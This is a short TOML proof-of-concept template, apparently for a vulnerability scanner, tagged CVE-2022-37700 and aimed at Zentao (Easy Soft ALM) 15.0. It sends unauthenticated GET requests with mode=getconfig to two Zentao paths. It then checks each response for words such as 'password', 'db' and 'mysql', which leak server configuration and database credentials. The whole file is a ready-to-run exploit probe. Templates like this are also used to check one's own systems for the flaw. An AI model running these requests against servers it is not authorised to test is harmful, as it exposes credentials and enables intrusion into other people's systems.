[info]
id = "POC-AVE-2022-0028"
name = "禅道 Easy Soft ALM 目录遍历信息泄露 PoC"
author = "AVE"
severity = "high"
tags = ["directory-traversal", "information-disclosure", "zentao"]
description = "禅道(Zentao) Easy Soft ALM 15.0 存在目录遍历漏洞，通过 mode=getconfig 接口可未授权获取敏感配置信息"
vuln_id = ["CVE-2022-37700", "AVE-2022-0028"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/zentao/index.php"
query.mode = "getconfig"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["db", "user", "password", "config"]
expect = true

[[poc.requests]]
method = "GET"
path = "/user-login.html/zentao/index.php"
query.mode = "getconfig"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["db", "config", "mysql"]
expect = true
